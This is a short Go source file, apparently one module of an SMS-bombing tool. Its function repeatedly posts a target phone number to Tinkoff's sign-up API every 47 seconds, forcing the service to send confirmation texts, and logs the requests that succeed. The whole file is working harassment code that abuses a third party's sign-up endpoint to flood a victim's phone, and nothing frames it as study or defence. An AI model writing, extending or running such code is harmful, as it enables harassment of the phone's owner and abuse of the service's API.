package main

import (
	"strings"
	"time"

	"github.com/valyala/fasthttp"
)

func tinkoff() {
	req := newreq()
	req.SetBodyString("phone=%2B" + num)
	req.SetRequestURI("https://api.tinkoff.ru/v1/sign_up")
	req.Header.SetMethod("POST")

	timeout := time.Second * 47
	if logging > 0 {
		var err error
		res := &fasthttp.Response{}

		for do {
			err = client.Do(req, res)

			if err == nil && strings.Index(string(res.Body()), `"resultCode":"WAITING_CONFIRMATION"`) != -1 {
				okLog(smsLog)
			} else {
				errLog(smsLog)
			}
			time.Sleep(timeout)
		}
	} else {
		for do {
			client.Do(req, nil)
			time.Sleep(timeout)
		}
	}
}
